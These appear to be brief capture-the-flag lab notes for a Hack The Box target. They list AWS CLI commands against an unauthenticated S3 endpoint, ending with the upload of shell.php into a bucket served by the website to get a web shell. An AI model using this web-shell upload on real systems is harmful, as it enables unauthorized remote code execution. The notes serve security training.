```
apt install awscli

*If authentication is disabled, fill the values with random values like 'temp'*

aws configure

aws --endpoint=http://s3.thetoppers.htb s3 ls <<< list available bucket in a server

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb <<< list the contents of a storage bucket

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb <<< copy a shell on our local box and put it in the bucket from which we can access from the website


```